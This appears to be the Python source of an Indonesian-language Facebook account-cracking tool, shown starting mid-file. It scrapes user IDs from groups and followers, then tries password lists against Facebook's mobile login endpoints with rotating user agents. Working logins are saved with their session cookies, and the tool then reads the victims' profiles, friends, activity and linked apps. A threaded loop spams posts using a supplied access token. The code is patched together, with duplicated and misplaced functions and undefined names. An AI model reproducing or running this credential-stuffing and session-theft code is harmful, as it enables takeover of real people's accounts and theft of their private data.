	print('\r%s >°< %s/%s <-> OK:%s <-> CP:%s <-> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			tix = time.time()
			ses.headers.update({"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://mbasic.facebook.com/login/?email='+idf).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'mbasic.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://mbasic.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://mbasic.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})

			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\n')
					statuscp = f'[•] ID : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='SESI'))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no'in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[OK]       : {idf}\n[OK] PASSWORD : {pw}\n[•] COOKIES  : {kuki}\n{infoakun}'   
				elif 'ya'in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki).text
					response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki).text
					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki).text
					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki).text
					response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki).text
				
					hit1, hit2 = 0,0
					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki).text
					cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki).text
					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
						infoakun += (f"Aplikasi Yang Terkait*\n")
						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
							infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
						else:
							infoakun += (f"	—_Aplikasi Aktif : \n")
							infoakun += (f"	—_Aplikasi Kedaluwarsa : \n")
					else:pass
					print('\n')
					statusok = f'[CP]       : {idf}\n[CP] PASSWORD : {pw}\n[•] COOKIES  : {kuki}\n{infoakun}'
					
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = parser(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = parser(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
def cek_opsi():
    c = len(akun)
    hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
    cetak(nel(hu, title='CEK OPSI'))
    input(x+'['+h+'•'+x+'] Mulai')
    cek = '# PROSES CEK OPSI DIMULAI'
    sol().print(mark(cek, style='green'))
    love = 0
    for kes in akun:
        try:
            try:
                id,pw = kes.split('|')[0],kes.split('|')[1]
            except IndexError:
                time.sleep(2)
                print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
                print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
                continue
            bi = random.choice([u,k,kk,b,h,hh])
            print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
            ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
            ses = requests.Session()
            header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
            hi = ses.get('https://mbasic.facebook.com')
            ho = parser(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
            if "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    jo = ho.find('form')
                    data = {}
                    lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
                    for anj in jo('input'):
                        if anj.get('name') in lion:
                            data.update({anj.get('name'):anj.get('value')})
                            kent = parser(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
                            print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
                            opsi = kent.find_all('option')
                            if len(opsi)==0:
                                print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
                            else:
                                for opsii in opsi:
                                    print('\r%s---> %s%s'%(kk,opsii.text,x))
                except:
                    print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
                    print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
            elif "c_user" in ses.cookies.get_dict().keys():
                print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
            else:
                print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))
                love+=1
        except requests.exceptions.ConnectionError:
                    print('')
                    li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
                    sol().print(mark(li, style='red'))
                    exit()
        dah = '# DONE'
        sol().print(mark(dah, style='cyan'))
        exit()
        
    def lah():
        print("\r"+balmond+m+" Total ID : "+str(len(id))+"                     ")
        input(balmond+m +" Mode Pesawat 5 Detik Dan Tekan Enter Untuk Mulai Crack ")
        pass
    setting()
    
def lah():
    print("\r"+balmond+m+" Total ID : "+str(len(id))+"                     ")
    input(balmond+m +" Mode Pesawat 5 Detik Dan Tekan Enter Untuk Mulai Crack ")
    pass
setting()
 
def grup():
    win = '# PASTIKAN ID GROUP PUBLIK'
    win2 = mark(win, style='cyan')
    sol().print(win2)
    id = input(""+balmond+h+" Id Atau User Name Grup : ")
    ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
    miskinlu = {"user-agent": ua}
    url = "https://m.facebook.com/groups/"+id
    ses = requests.Session()
    try:
        gn = parser(ses.get(url, headers=miskinlu).text, "html.parser")
    except requests.exceptions.ConnectionError:
        print(balmond+m+" Koneksi Internet Terputus..")
        time.sleep(0.5)
        exit()
    berr = gn.find("title")
    berr2 = berr.text.replace(" | Facebook","").replace(" Grup Publik","")
    if berr2=='Masuk Facebook':
        print(balmond+m+" Limit, Silahkan Mode Pesawat Dan Coba Lagi..")
        time.sleep(0.5)
        exit()
    elif berr2=='Kesalahan':
        print(balmond+m+" Grup Tidak Ditemukan..")
        time.sleep(0.5)
        exit()
    else:pass
    print(""+balmond+p+" Nama Grup : "+berr2)
    ggs = gn.find_all('table')
    ang = []
    for ff in ggs:
        anggo = ff.text
        bro = anggo.replace('Anggota','')
        try:
            mex = int(bro)
            jumlah = ang.append(mex)
        except:
            pass
        if len(ang)==0:
            print(balmond+h+" Anggota : -")
        else:
            print(balmond+h+" Anggota : "+str(ang[0]))
            grup1(url)

def grup1(urls):
	use = []
	ses = requests.Session()
	print(""+balmond+p+" Jika Stack, Mode Pesawat 5 Detik")
	print(balmond+p+" Sedang Mengumpulkan ID")
	print(balmond+p+" Tekan CTRL + C Untuk Stop")
	while True:
		try:
			ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
			miskinlu = {"user-agent": ua}
			try:
				url = use[0]
			except:
				url = urls
			set = parser(ses.get(url, headers=miskinlu).text, "html.parser")
			bf2 = set.find_all('a')
			for g in bf2:
				css = str(g).split('>')
				if 'Lihat Postingan Lainnya</span' in css:
					bcj = str(g).replace('<a href="','').replace('amp;','')
					bcj2 = bcj.split(' ')[0].replace('"><img','')
			tes = set.find_all('table')
			for cari in tes:
				liatnih = cari.text
				spl = liatnih.split(' ')
				if 'mengajukan' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					namayou = liatnih.replace(' mengajukan pertanyaan .','')
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						id.append(idku)
						print(("\r"+balmond+h+" { "+k+"Proses Mengambil ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
				elif '>' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					namayou = liatnih.split(' > ')[0]
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						id.append(idku)
						print(("\r"+balmond+h+" { "+O+"Mengumpulkan ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
				else:
					continue
			try:
				link_ = bcj2
				use.insert(0,'https://m.facebook.com'+link_)
			except:
				girang = set.find('title')
				girang2 = girang.text.replace(" | Facebook","").replace(" Grup Publik","")
				if girang2=='Masuk Facebook':
					pass
				else:
					lah()
		except requests.exceptions.ConnectionError:
			try:
				time.sleep(31)
			except KeyboardInterrupt:
				lah()
		except KeyboardInterrupt:
			lah()

saat_ini = datetime.datetime.now()

def run(link, token):

    while True:

        headers = {

            'authority': 'graph.facebook.com',

            'cache-control': 'max-age=0',

            'sec-ch-ua-mobile': '?0',

            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.66 Safari/537.36',

        }

        try:

          response = requests.post(f'https://graph.facebook.com/me/feed?link={link}&published=0&access_token={token}', headers=headers)

          print(response.text)

        except:

          sys.exit()

def main():

    banner_logo()

    print('\x1b[0;94m┌───────────────────────────────────┐')
    #link = input('Link Posts : ')
    token = input('├──[•] Token Facebook :\x1b[0;92m ')

   # token = input('Token FB : ')
    link = input('\x1b[0;94m├──[•] Link Postingan :\x1b[0;92m ')
    print('\x1b[0;94m└───────────────────────────────────┘')

    number_thread = int(input('[✓]––>ISI AJA 20 BG  :\x1b[0;92m  '))

    for i in range(number_thread):
        thread = threading.Thread(target=run, args=(link, token))
#        print('SINGEK',thread.start())
        thread.start()
        
def follower():
    try:
        token = open('.token.txt', 'r').read()
    except IOError:
        exit()

    win = '# DUMP ID DARI FOLLOWER'
    win2 = mark(win, style='cyan')
    sol().print(win2)
    print(x + '[' + h + '•' + x + '] Ketik "me" Jika Ingin Dari Follower Mu')
    pili = input(x+'['+p+'f'+x+'] Masukkan ID Facebook : ')
    try:
        koh2 = requests.get('https://graph.facebook.com/' + pili + '?fields=subscribers.limit(5000)&access_token=' + tokenku[0]).json()
        for pi in koh2['subscribers']['data']:
            try:
                id.append(pi['id'] + '|' + pi['name'])
            except:
                continue

        print(x + '[' + h + '•' + x + '] Total : ' + str(len(id)))
        setting()
    except requests.exceptions.ConnectionError:
        li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
        lo = mark(li, style='red')
        sol().print(lo, style='cyan')
        exit()
    except (KeyError, IOError):
        teks = '# FOLLOWER TIDAK PUBLIK ATAU TOKEN RUSAK'
        teks2 = mark(teks, style='red')
        sol().print(teks2)
        exit()

def uagent():
	print ("\n[01]. Ganti user agent ")
	print ("[02]. Cek user agent ")
	print ("[00]. Kembali ")
	__Aang__Sayang__Laura__ = input('\n[+] Pilih : ')
	uas(__Aang__Sayang__Laura__)
	
def uas(__Aang__Sayang__Laura__):
	if __Aang__Sayang__Laura__ == '':
		print ('\n[!] Yang bener kontol');time.sleep(2)
		uas(__Aang__Sayang__Laura__)
	elif __Aang__Sayang__Laura__ in("1","01"):
		print ("[!] Ketik cancel untuk gunakan ua dari script")
		ua = input("[!] User agent : ")
		if ua in(""):
			print ('\n[!] Yang bener kontol');time.sleep(2)
			setting()
		elif ua in("CANCEL","Cancel","cancel"):
			ua_ = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
			open("ua.txt","w").write(ua_);time.sleep(2)
			print ("\n[✓]  Berhasil menggunakan user agent script ");time.sleep(2)
			setting()
		open("ua.txt","w").write(ua);time.sleep(2)
		print ("\n[✓] Berhasil mengganti user agent");time.sleep(2)
		setting()
	elif __Aang__Sayang__Laura__ in("2","02"):
		try:
			ualo = open('ua.txt', 'r').read();time.sleep(2)
			print ("[+] User anget lu : "+ualo);time.sleep(2)
			input('\n[!] Tekan enter ')
			setting()
		except IOError:
			print('error')
	elif __Aang__Sayang__Laura__ in("0","00"):
		setting()
	else:
		print ('\n[!] Yang bener bang');time.sleep(2)
		uas(__Aang__Sayang__Laura__)
  
def main(self, total, email, password):
        try:
            for pws in password:
                self.useragent = self.realme_useragent(total = 1)
                with requests.Session() as r:
                    r.headers.update({
			    'host': 'mbasic.facebook.com',
			    'cache-control': 'max-age=0',
			    'upgrade-insecure-requests': '1',
			    'origin': 'https://mbasic.facebook.com',
			    'content-type': 'application/x-www-form-urlencoded',
			    'user-agent': self.useragent,
			    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			    'sec-fetch-site': 'same-origin',
			    'sec-fetch-mode': 'cors',
			    'sec-fetch-user': 'empty',
			    'sec-fetch-dest': 'document',
			    'referer': 'https://mbasic.facebook.com/login/?email=',
			    'accept-encoding':'gzip, deflate br',
			    'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
                    response = r.get('https://m.alpha.facebook.com/login.php?').text
                    try:
                        self.jazoest = re.search('name="jazoest" value="(\d+)"', str(response)).group(1)
                        self.m_ts = re.search('name="m_ts" value="(.*?)"', str(response)).group(1)
                        self.li = re.search('name="li" value="(.*?)"', str(response)).group(1)
                        self.fb_dtsg = re.search('{"dtsg":{"token":"(.*?)"', str(response)).group(1)
                        self.lsd = re.search('name="lsd" value="(.*?)"', str(response)).group(1)
                        self.__a = re.search('"encrypted":"(.*?)"', str(response)).group(1)
                        self.__spin_t = re.search('"__spin_t":(\d+),', str(response)).group(1)
                    except (AttributeError) as e:
                        Console().print("[bold hot_pink2]   ╰─>[bold red] Terjadi Kesalahan!                    ", end='\r');time.sleep(2.0);continue
                    data = {
                        'm_ts': self.m_ts,
                        'li': self.li,
                        'try_number': 0,
                        'unrecognized_tries': 0,
                        'email': email,
                        'prefill_contact_point': email,
                        'prefill_source': 'browser_dropdown',
                        'prefill_type': 'password',
                        'first_prefill_source': 'browser_dropdown',
                        'first_prefill_type': 'contact_point',
                        'had_cp_prefilled': True,
                        'had_password_prefilled': True,
                        'is_smart_lock': False,
                        'bi_xrwh': 0,
                        'encpass': '#PWD_BROWSER:0:{}:{}'.format(self.__spin_t, pws),
                        'fb_dtsg': self.fb_dtsg,
                        'jazoest': self.jazoest,
                        'lsd': self.lsd,
                        '__dyn': '',
                        '__csr': '',
                        '__req': random.choice(['1','2','3','4','5']),
                        '__a': self.__a,
                        '__user': 0
                    }
                    r.headers.update({
                        'cookie': ("; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])),
                        'sec-fetch-site': 'same-origin',
                        'origin': 'https://m.alpha.facebook.com',
                        'accept': '*/*',
                        'content-type': 'application/x-www-form-urlencoded',
                        'x-fb-lsd': self.lsd,
                        'referer': 'https://m.alpha.facebook.com/login.php?',
                        'content-length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ])))
                    })
                    response2 = r.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', data = data, allow_redirects = True)
                    #open('Response.txt', 'a+').write(f'{email}|{pws}|{r.cookies.get_dict()}\n')
                    if 'c_user' in r.cookies.get_dict().keys():
                        try:
                            self.cookie = (";".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]))
                        except:pass
                        tree = Tree("\r[bold white]LOGIN SUCCESS                      ", style = "bold white")
                        tree.add(f"[bold green]Email : {email}").add(f"[bold green]Password : {pws}", style = "bold white")
                        tree.add(f"[bold green]Cookie : {self.cookie}", style = "bold white")
                        print(tree)
                        self.success.append(f'{email}|{pws}|{self.cookie}')
                        open('Results/Ok.txt', 'a+').write(f'{email}|{pws}|{self.cookie}\n')
                        break
                    elif 'checkpoint' in r.cookies.get_dict().keys():
                        tree = Tree("\r[bold white]LOGIN CHECKPOINT                      ", style = "bold white")
                        tree.add(f"[bold red]Email : {email}").add(f"[bold red]Password : {pws}", style = "bold white")
                        tree.add(f"[bold red]Useragent : {self.useragent}", style = "bold white")
                        print(tree)
                        self.checkpoint.append(f'{email}|{pws}|{self.useragent}')
                        open('Results/Cp.txt', 'a+').write(f'{email}|{pws}|{self.useragent}\n')
                        break
                    else:
                        continue
            self.looping += 1
            Console().print(f"[bold hot_pink2]   ╰─>[bold white] Crack {str(len(Dump))}/{self.looping} Ok:-[bold green]{len(self.success)}[bold white] Cp:-[bold red]{len(self.checkpoint)}[bold white]              ", end='\r')
        except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError):
            Console().print("[bold hot_pink2]   ╰─>[bold red] Koneksi Error!                    ", end='\r');time.sleep(7.9);self.main(total, email, password)
        except Exception as e:
            Console().print(f"[bold hot_pink2]   ╰─>[bold red] {str(e).title()}!                    ")
    ### REALME USERAGENT ###
def realme_useragent(self, total):
        for _ in range(total):
            self.useragent = ('Mozilla/5.0 (Linux; Android 12; M2010J19SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36')
        return self.useragent
		
if __name__ == '__main__':
    try:
        setting()
    except Exception as e:
        Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
